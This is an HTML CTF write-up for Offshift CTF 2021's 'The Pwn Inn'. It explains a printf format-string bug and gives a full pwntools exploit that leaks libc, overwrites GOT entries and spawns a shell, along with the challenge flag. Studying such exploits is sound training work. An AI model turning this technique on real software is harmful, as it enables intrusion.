@@ -1,0 +1,88 @@
+<!--Add date: 01/30/2021-->
+
+<h1>Offshift CTF 2021 - The Pwn Inn</h1>
+
+<h2>Binary Exploitation - 477 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Program Behavior</h5>
+
+<p>This binary features a typical format string exploit. After initialization and printing a greeting message, the following procedure is run:</p>
+
+<img class = "small" src = "./images/os2021_pwninn_1.png">
+
+<p>The application reads 0x100 = 256 bytes into a buffer (no overflow problems here), prints <code>Welcome </code>, then calls <code>printf()</code> on the user input. Clearly there is a format string vulnerability here; the strategy will be to perform arbitrary writes to the Global Offset Table (GOT).</p>
+
+<h5>Information Leaks</h5>
+
+<p>Getting the address of objects is easy with a format string vulnerability. Further, PIE is disabled so the text base is also known. Since we require more than one round of <code>printf()</code> vulnerability, we will first overwrite <code>exit()</code> in the GOT to the address of <code>echo()</code>. At the same time, we can leak the address of another function in the GOT, say, <code>alarm()</code> so that we can bypass ASLR and obtain <code>libc</code>.</p>
+
+<h5>Arbitrary Write</h5>
+
+<p>After obtaining the address of <code>libc</code>, we can now seek a shell with a call to <code>system("/bin/sh")</code>. Since we control the contents of the buffer in <code>echo()</code>, and <code>printf()</code> is called with that buffer as an argument, it makes sense to target <code>printf()</code> to overwrite with <code>syste()</code>. One potential issue is that <code>printf()</code> is also called on the static string <code>"Welcome "</code>. However, this is not an issue: <code>system()</code> <i>forks</i> the current process and upon error, it won't affect the parent process (besides returning a status code).</p>
+
+<p>The meat of the challenge is automating the second format string to overwrite the GOT with a variable argument. This is actually not so bad and can be happily done with some Python format strings as demonstrated in the payload below.</p>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+
+from pwn import *
+
+ready = True
+debug = False
+
+if ready:
+    p = remote("185.172.165.118", 2626)
+    LIBC = ELF("./libc-2.31.so")
+else:
+    p = process("./pwninn")
+    LIBC = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
+    if debug:
+        context.terminal = ["/mnt/c/Users/********/wsl-terminal/open-wsl.exe", "-e"]
+        gdb.attach(p, gdbscript = '''
+        b *0x401305
+        b *0x401319
+        ''')
+
+alarm_got_plt = 0x404038
+exit_got_plt = 0x404058
+
+target = 0x4012c4
+p.recvline()
+payload = (b"%14$6s" +
+        (b"%%1$%dd" + b"%%15$hn" +
+        b"%%1$%dd" + b"%%16$hn" +
+        b"%%1$%dd" + b"%%17$hn") % (((target >> 0) - 6) & 0xffff,
+            ((target >> 16) - (target >> 0)) & 0xffff,
+            ((target >> 32) - (target >> 16)) & 0xffff)).ljust(0x40, b'\x00') + p64(alarm_got_plt) + p64(exit_got_plt) + p64(exit_got_plt + 2) + p64(exit_got_plt + 4)
+
+p.sendline(payload)
+p.recvuntil("Welcome ")
+LIBC.address = u64(p.recv(6).ljust(8, b'\x00')) - LIBC.sym["alarm"]
+log.info("Libc base: %s" % (hex(LIBC.address)))
+
+p.recv()
+printf_got_plt = 0x404030
+system = LIBC.sym["system"]
+log.info("System address: %s" % (hex(system)))
+payload2 = ((b"%%1$%dd" + b"%%14$hn" +
+        b"%%1$%dd" + b"%%15$hn" +
+        b"%%1$%dd" + b"%%16$hn") % (((system >> 0) - 0x0) & 0xffff,
+            ((system >> 16) - (system >> 0)) & 0xffff,
+            ((system >> 32) - (system >> 16)) & 0xffff)).ljust(0x40, b'\x00') + p64(printf_got_plt) + p64(printf_got_plt + 2) + p64(printf_got_plt + 4)
+
+p.sendline(payload2)
+
+p.recv()
+p.sendline("/bin/sh")
+
+p.interactive()
+</pre>
+
+<h4>Flag</h4>
+
+<p><code>flag{GOTt4_b3_OVERWRITEing_th0s3_symb0ls_742837423}</code></p>
